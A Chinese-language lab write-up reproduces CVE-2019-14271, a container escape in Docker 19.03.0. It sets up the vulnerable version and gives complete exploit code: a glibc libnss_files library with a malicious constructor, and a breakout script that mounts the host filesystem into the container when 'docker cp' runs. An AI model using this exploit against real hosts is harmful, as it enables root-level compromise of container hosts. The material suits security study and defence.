# CVE-2019-14271docker cp逃逸漏洞

参考：https://www.geekby.site/2021/11/%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/

http://www.blogdaren.com/post-2415.html

https://bestwing.me/CVE-2019-14271-docker-escape.html

https://xz.aliyun.com/t/6806

## 1.背景

CVE-2019-14271是一个通过宿主机docker cp容器文件导致任意命令执行的漏洞，目前已知的影响版本只有docker 19.03.0(包含几个beta版)，19.03.1以上以及18.09以下都不收影响。漏洞起源于docker开源项目issue上docker19.03.0版本docker cp产生的报错:

```sh
Error response from daemon: error processing tar file: docker-tar: relocation error: /lib/arm-linux-gnueabihf/[libnss_files.so](http://libnss_files.so/).2: symbol __libc_readline_unlocked, version GLIBC_PRIVATE not defined in file [libc.so](http://libc.so/).6 with link time reference : exit status 127
```

docker源码issue链接地址：https://github.com/moby/moby/issues/39449

## 2.漏洞原理

docker cp 命令依赖的 docker-tar 组件会加载容器内部的 nsswitch 动态链接库，攻击者可以通过劫持容器内部的 nsswitch 来实现代码的注入，获得宿主机上的 root 权限的代码执行能力。

用户在执行 docker cp 后，Docker 守护进程启动 `docker-tar` 进程来完成复制。

例如：从容器内文件复制到宿主机过程：①切换进程的根目录(执行 chroot)到容器根目录，②将需要复制的文件打包，然后传递给 Docker 守护进程，③Docker 守护进程负责将内容解析到用户指定的宿主机目标路径。

chroot 的操作主要是为了避免符号链接导致的路径穿越问题，但存在漏洞版本的 `docker-tar` 会加载必要的动态链接库，主要以 `libness_` 开头的 nsswitch 动态链接库。chroot 切换根目录后，`docker-tar` 将加载容器内部的动态链接库。

**漏洞利用过程如下**：

- 找出 `docker-tar` 具体会加载哪些容器内的动态链接库。
- 下载对应的动态链接库源码，增加 `__attribute__` 属性的函数 `run_at_link`(该函数在动态链接库被加载时首先执行)
- 等待 docker cp 触发漏洞

## 3.实验准备

环境搭建：

以下操作均是在ubuntu18.04环境下。

### 3.1 安装 apt 依赖包，用于通过HTTPS来获取仓库

```bash
apt-get install \
    apt-transport-https \
    ca-certificates \
    curl \
    gnupg-agent \
    software-properties-common
```

![image-20211124110344004](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20211124110344004.png)

### 3.2 添加 Docker 的官方 GPG 密钥

```bash
curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add -
```

![image-20211124110657995](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20211124110657995.png)

### 3.3 设置稳定版仓库

```bash
add-apt-repository \
   "deb [arch=amd64] https://download.docker.com/linux/ubuntu \
  $(lsb_release -cs) \
  stable"
```

![image-20211124110914066](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20211124110914066.png)

### 3.4 安装有漏洞的docker版本

```bash
apt-get install docker-ce=5:19.03.0~3-0~ubuntu-bionic docker-ce-cli=5:19.03.0~3-0~ubuntu-bionic containerd.io
```

![image-20211124111013884](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20211124111013884.png)

查看docker版本：

```bash
docker -v
```

![image-20211123155146833](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20211123155146833.png)



## 4.实验步骤

### 4.1 确定目标

确定docker cp执行中用到哪些容器内的动态链接库。

在存在漏洞的 Docker 环境中，创建容器：

```bash
docker run -itd --name=test ubuntu
```

寻找容器在宿主机上的绝对路径：

```bash
docker exec -it test cat /proc/mounts | grep docker
```

![image-20211124150339442](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20211124150339442.png)

由上图可知返回结果包含：

```Code
workdir=/var/lib/docker/overlay2/538746b672aea80f1f9a5a7fea2d5185f1f123a0836e62e2d073e70905211c4b/work
```

所以容器在宿主机上的绝对路径即为：

```code
/var/lib/docker/overlay2/538746b672aea80f1f9a5a7fea2d5185f1f123a0836e62e2d073e70905211c4b/merged
```

安装监控文件：

```bas
apt install inotify-tools
```

如果报错：Unable to acquire the dpkg frontend lock (/var/lib/dpkg/lock-frontend), is another process using it?

执行如下命令：

```bas
sudo rm /var/lib/dpkg/lock-frontend
sudo rm /var/lib/dpkg/lock
sudo rm /var/cache/apt/archives/lock
```

![image-20211123160504478](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20211123160504478.png)

监控文件夹（容器所在的文件夹）：

```bash
inotifywait -mr /var/lib/docker/overlay2/538746b672aea80f1f9a5a7fea2d5185f1f123a0836e62e2d073e70905211c4b/merged/lib
```

![image-20211124152448693](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20211124152448693.png)

另起一个终端执行：

```fallback
docker cp test:/etc/passwd ./
```

![image-20211123160832625](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20211123160832625.png)

![image-20211124152729890](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20211124152729890.png)

可以看到加载了 `libnss_files-2.31.so`

### 4.2 构建动态链接库

`libnss_*.so` 均在 Glibc 中，首先下载 Glibc 库到本地。

```bash
mkdir cve-2019-1427 && cd cve-2019-1427
wget https://ftp.gnu.org/gnu/glibc/glibc-2.27.tar.gz
tar -zxvf glibc-2.27.tar.gz
cd glibc-2.27
vi Makeconfig
```

首先要注释掉 `gccwarn-c = -Wstrict-prototypes -Wold-style-definition`，避免加入 payload 后编译失败。

![image-20211123165559022](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20211123165559022.png)

在 `./nss/nss_files` 目录下任意源码文件中添加 payload。以 `files-service.c` 为例。

```bash
vi ./nss/nss_files/files-service.c
```

在files-service.c中添加如下内容（中文去掉，否则安装会报错）：

```c
// content should be added into nss/nss_files/files-service.c
#include <sys/types.h>
#include <unistd.h>
#include <stdio.h>
#include <sys/wait.h>

# 容器内部原始 libnss_files.so.2 文件备份位置
#define ORIGINAL_LIBNSS "/original_libnss_files.so.2"
# 恶意 libnss_files.so.2 文件位置
#define LIBNSS_PATH "/lib/x86_64-linux-gnu/libnss_files.so.2"
 
bool is_priviliged();
 
__attribute__ ((constructor)) void run_at_link(void) {
     char * argv_break[2];
  // 判断是否容器外是高权限执行，即 docker-tar
     if (!is_priviliged())
           return;
 
  // 攻击执行一次即可，用原始的替换备份的库文件
  // 避免后续对环境产生影响
     rename(ORIGINAL_LIBNSS, LIBNSS_PATH);
  
    // 以 docker-tar 运行 /breakout 恶意脚本
  	if (!fork()) {
        // Child runs breakout
        argv_break[0] = strdup("/breakout");
        argv_break[1] = NULL;
        execve("/breakout", argv_break, NULL);
     }
     else
        wait(NULL); // Wait for child
 
     return;
}

bool is_priviliged() {
     FILE * proc_file = fopen("/proc/self/exe", "r");
     if (proc_file != NULL) {
           fclose(proc_file);
           return false; // can open so /proc exists, not privileged
     }
     return true; // we're running in the context of docker-tar
}
```

**编译：**

```bash
cd glibc-2.27
mkdir glibc-build
apt install bison gawk
cd glibc-build
../configure --prefix=/usr/
make && make install
```

如果报错：/usr/bin/ld: cannot find -lnss_test2
collect2: error: ld returned 1 exit status

![image-20211124165420806](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20211124165420806.png)

解决办法参考：https://garlicspace.com/2020/07/18/centos7-%E5%8D%87%E7%BA%A7-glibc-gcc/#nss_test2

```shell
cd glibc-2.27
vi ./scripts/test-installation.pl
```

找到如下位置，添加`&& $name ne "nss_test2"`

![image-20211124170132993](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20211124170132993.png)

如果报错：Library libdl is not correctly installed since the test program
was not linked dynamically against it.
Do you have a file/link libdl.so?

![image-20211125093155896](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20211125093155896.png)

解决办法参考：https://www.freesion.com/article/53141201513/

```bash
vi ../scripts/test-installation.pl
```

添加-Wl,--no-as-needed

![image-20211125094257622](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20211125094257622.png)

修复完成之后再执行：

```ba
make && make install
```

安装成功

![image-20211125094456839](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20211125094456839.png)

### 4.3 逃逸

```bash
cd cve-2019-1427
vi breakout
```

将 procfs 伪文件系统挂载到容器内，将 PID 为 1 的根目录 /proc/1/root 绑定挂载到容器内部即可。

breakout内容：

```shell
#!/bin/bash
mkdir /host_fs
mount -t proc none /proc     # mount the host's procfs over /proc
cd /proc/1/root              # chdir to host's root
mount --bind . /host_fs      # mount host root at /host_fs
```

**创建victim容器：**

```bash
docker run -itd --name=victim ubuntu
```

将 breakout 脚本放到 victim 容器根目录。

```bash
chmod 755 breakout
docker cp ./breakout victim:/breakout
```

进入容器，再将 `/lib/x86_64-linux-gnu` 下的 `libnss_files.so.2` 符号链接指向库文件移动到容器根目录下并重命名为 `original_libnss_files.so.2`

```bash
docker exec -it victim /bin/bash
readlink /lib/x86_64-linux-gnu/libnss_files.so.2
mv /lib/x86_64-linux-gnu/libnss_files.so.2 /original_libnss_files.so.2
```

![image-20211125094737550](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20211125094737550.png)最后将构建好的恶意 `libnss_files.so` 重命名为 `libnss_files.so.2`，放到容器内 `/lib/x86_64-linux-gnu` 下。

```bash
docker cp ./glibc-2.27/glibc-build/nss/libnss_files.so victim:/lib/x86_64-linux-gnu/libnss_files.so.2
```

![image-20211125095116853](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20211125095116853.png)

模拟用户执行 docker cp 操作：

```bash
docker cp victim:/etc/passwd ./
```

执行后，漏洞被触发，容器内部已经能看到挂载的 `/host_fs`，其中的 `/etc/hostname` 显示的即为宿主机的 `hostname`。

![image-20211125095325449](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20211125095325449.png)